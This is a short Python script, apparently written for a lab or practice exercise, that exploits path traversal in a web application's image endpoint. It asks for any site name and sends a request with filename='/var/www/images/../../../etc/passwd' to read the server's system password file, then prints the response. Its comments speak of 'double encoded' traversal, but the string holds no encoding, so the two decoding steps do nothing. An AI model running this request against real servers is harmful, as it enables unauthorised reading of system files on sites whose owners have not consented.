from urllib.parse import unquote

# Crafted filename (double encoded traversal)
filename = "/var/www/images/../../../etc/passwd"

# Decoding steps
print(unquote(filename))         # First decode
print(unquote(unquote(filename)))  # Second decode (actual traversal revealed)

import requests

s = requests.Session()

site = input("Provide site link: ")  # Fixed the input line
url = f"https://{site}/image?filename={filename}"  # Constructs the URL
resp = s.get(url)
print(resp.text)